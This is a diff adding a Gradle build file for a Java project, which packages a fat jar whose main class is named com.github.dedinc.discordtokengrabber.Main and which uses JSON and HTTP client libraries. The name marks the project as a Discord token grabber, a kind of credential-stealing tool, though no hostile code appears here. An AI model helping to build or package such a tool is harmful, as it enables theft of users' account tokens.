@@ -1,0 +1,23 @@
+plugins {
+    id 'java'
+    id "com.github.johnrengelman.shadow" version "7.1.2"
+}
+
+group 'com.github.dedinc'
+version '1.0'
+
+repositories {
+    mavenCentral()
+
+}
+
+jar{
+    manifest{
+        attributes("Main-Class": "com.github.dedinc.discordtokengrabber.Main")
+    }
+}
+
+dependencies {
+    implementation 'org.json:json:20220320'
+    implementation 'com.squareup.okhttp3:okhttp:3.14.9'
+}
